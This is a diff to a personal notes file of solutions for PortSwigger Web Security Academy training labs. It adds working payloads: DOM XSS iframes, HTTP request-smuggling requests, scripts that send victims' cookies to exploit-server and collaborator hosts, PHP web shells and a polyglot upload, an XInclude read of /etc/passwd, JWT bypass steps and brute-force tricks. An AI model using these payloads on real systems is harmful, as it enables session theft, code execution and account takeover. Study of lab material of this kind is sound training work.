@@ -349,7 +349,21 @@ Lab is not available at the moment (17/04/2026)
 ## DOM-based vulnerabilities
 ### Notes
 ### Labs
-- Coming Soon
+{% raw %}
+
+```html
+<!-- DOM XSS using web messages -->
+<iframe src="https://0a8600c1034d05b980b5809f00260023.web-security-academy.net" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
+<!-- DOM XSS using web messages and a JavaScript URL -->
+<iframe src="https://0a8000db045b248c801e719d009500d6.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+<!-- DOM XSS using web messages and JSON.parse -->
+<iframe src="https://0aaf00cd03c7951380a7268a00bb0080.web-security-academy.net" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}", "*")'>
+<!-- DOM-based open redirection -->
+https://0a1d00eb041ac95a806fe9e000c300be.web-security-academy.net/post?postId=7&url=https://exploit-0a9d004a0491c95480a0e8bf0159002d.exploit-server.net
+<!-- DOM-based cookie manipulation -->
+<iframe src="https://0a0900b604857644800c26430093005b.web-security-academy.net/product?productId=2&'><script>print()</script> onload="if(!window.x)this.src='https://0a0900b604857644800c26430093005b.web-security-academy.net';window.x=1;">
+```
+{% endraw %}
 
 ## Cross-origin resource sharing (CORS)
 ### Cheat Sheet 
@@ -452,7 +466,40 @@ http%3a%2f%2f127.1%2f%25%36%31dmin/delete?username=carlos
 ## HTTP request smuggling
 ### Notes
 ### Labs
-- Coming Soon
+{% raw %}
+```txt
+<!-- HTTP request smuggling, confirming a CL.TE vulnerability via differential responses -->
+
+<!-- HTTP request smuggling, basic CL.TE vulnerability -->
+POST / HTTP/1.1
+Host: 0a8f009c036a55f58093a3af00640011.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+<!-- HTTP request smuggling, basic TE.CL vulnerability -->
+POST / HTTP/1.1
+Host: 0ad7001e0377456780ff1cd600ca00ca.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+56
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+
+0
+
+
+<!-- HTTP request smuggling, obfuscating the TE header -->
+
+```
+{% endraw %}
 
 ## OS command injection
 ### Notes
@@ -572,19 +619,35 @@ Referer: https://0a590035045fa8b680f3f8cb00ef0050.web-security-academy.net/admin
 - [Passowrds list](https://portswigger.net/web-security/authentication/auth-lab-passwords)
 
 ### Labs
-```sh
-# Username enumeration via different responses
+```txt
+<!-- Username enumeration via different responses -->
 use burp intruder
-# 2FA simple bypass
+<!-- 2FA simple bypass -->
 skip 2FA by go to /my-account after login
-# Password reset broken logic
+<!-- Password reset broken logic -->
 temp-forgot-password-token=jshqm0jq81le9fz4r8unmk4dbhcb2dvq&username=carlos&new-password-1=carlos&new-password-2=carlos (change username to carlos)
-# Username enumeration via subtly different
+<!-- Username enumeration via subtly different -->
 the invalid one has '.', use regex to do
-# Username enumeration via response timing
+<!-- Username enumeration via response timing -->
 use long password and observe response timing
-# Broken brute-force protection, IP block
-
+<!-- Broken brute-force protection, IP block -->
+the rate hit when enter incorrect password 3 times in a row, if we enter incorrect password 2 times and correct 1 time, the rate will reset. use this technique to bruteforce correct victim's password using intruder by setting rescoure pool maximum request to 1
+<!-- Username enumeration via account lock -->
+first, enum username until you see rate limit, that indicates that it is the correct username.
+second, brutefore password
+<!-- 2FA broken logic -->
+change 'verify' param to carlos then bruteforce mfa-code
+<!-- Brute-forcing a stay-logged-in cookie -->
+stay-logged-in cookie formula is Base64(username:md5(password)), to solve the solve, remove session value cuz if stay-logged-in is checked it will generate it for us, then add rules in burp intruder and bruteforce carlos'password
+<!-- Offline password cracking -->
+comment has XSS vulnerability, and cookie stay-logged-in exposed password hash. Issue the payload below to get victim's stay-logged-in cookie then crack the password offline
+<script>
+document.location='https://exploit-0afe00350484507a820a553901cc00cf.exploit-server.net/'+document.cookie
+</script>
+<!-- Password reset poisoning via middleware -->
+the site supports X-Forwarded-Host, set it to your exploit server URL then we can get the password reset token from our access log
+<!-- Password brute-force via password change -->
+username=carlos&current-password=$1$&new-password-1=2&new-password-2=3
 ```
 
 ## WebSockets
@@ -702,22 +765,63 @@ Host: 192.168.0.1
 ## OAuth authentication
 ### Notes
 ### Labs
-- Coming Soon
+```txt
+
+```
 
 ## File upload vulnerabilities
 ### Notes
 ### Labs
-- Coming Soon
+{% raw %}
+```php
+// Remote code execution via web shell upload
+<?php echo file_get_contents('/home/carlos/secret'); ?> // exploit.php
+// Web shell upload via Content-Type restriction bypass
+change Content-Type to image/jpeg the upload exploit.php
+// Web shell upload via path traversal
+change filename="..%2fexploit.php" then request to /files/exploit.php
+// Web shell upload via extension blacklist bypass
+change filename to .htaccess, change Content-Type to text/plain with this content 'AddType application/x-httpd-php .l33t'. Then, upload exploit exploit.l33t to bypass extension and .htaccess will read .t33t as .php and will be executed as .php
+// Web shell upload via obfuscated file extension
+change filename="exploit.php%00.jpg". This results in exploit.php has been uploaded
+// Remote code execution via polyglot web shell upload
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" polyglot.jpg -o polyglot.php
+```
+{% endraw %}
 
 ## JWT
 ### Notes
+- JWT wordlist can be found [here](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).
+
 ### Labs
-- Coming Soon
+{% raw %}
+```sh
+# JWT authentication bypass via unverified signature
+change sub field of payload from wiener to administrator then go to /admin to delete user
+# JWT authentication bypass via flawed signature verification
+change sub field of payload from wiener to administrator and change alg of header to none then go to /admin to delete user
+# JWT authentication bypass via weak signing key
+https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
+# JWT authentication bypass via jwk header injection
+https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection
+# JWT authentication bypass via jku header injection
+https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
+# JWT authentication bypass via kid header path traversal
+https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal
+```
+{% endraw %}
 
 ## Essential skills
 ### Notes
 ### Labs
-- Coming Soon
+{% raw %}
+```sh
+# Discovering vulnerabilities quickly with targeted scanning
+productId=<dji xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></dji>&storeId=1
+# Scanning non-standard data structures
+Cookie: session='"><svg/onload=fetch(`//kth638bej4u0p1t6kzki0uq6lxrofj38.oastify.com/${encodeURIComponent(document.cookie)}`)>:gKkoHg0Szv9tvluAUawQdWTRQX8kmCIj
+```
+{% endraw %}
 
 ## Prototype pollution
 ### Notes
@@ -877,12 +981,12 @@ fragment TypeRef on __Type {
 ### Labs
 
 {% raw %}
-```graphql
-<!-- Accessing private GraphQL posts -->
+```sql
+-- Accessing private GraphQL posts
 {"query":"query getBlogPost($id: Int!) {\n    getBlogPost(id: $id) {\n        image\n        title\n        author\n        date\n        paragraphs\n        postPassword\n    }\n}","variables":{"id":3}}
-<!-- Accidental exposure of private GraphQL fields -->
+-- Accidental exposure of private GraphQL fields
 {"query":"query getUser {\r\n    getUser(id:1) {\r\n        id\r\n        password\r\n        username\r\n    }\r\n}","operationName":"getUser"}
-<!-- Finding a hidden GraphQL endpoint -->
+-- Finding a hidden GraphQL endpoint
 query($id: Int!) {
   getUser(id: $id) {
     id
@@ -899,7 +1003,7 @@ mutation($input: DeleteOrganizationUserInput) {
   }
 }
 {"input":{"id":3}}
-<!-- Bypassing GraphQL brute force protections -->
+-- Bypassing GraphQL brute force protections
 mutation {
   bruteforce0: login(input: { password: "123456", username: "carlos" }) {
     token
@@ -913,9 +1017,9 @@ mutation {
     success
   }
 }
-<!-- Performing CSRF exploits over GraphQL -->
+-- Performing CSRF exploits over GraphQL
 <html>
-  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  -- CSRF PoC - generated by Burp Suite Professional
   <body>
     <form action="https://0aa200710432e54885292c92008a00e8.web-security-academy.net/graphql/v1" method="POST">
       <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
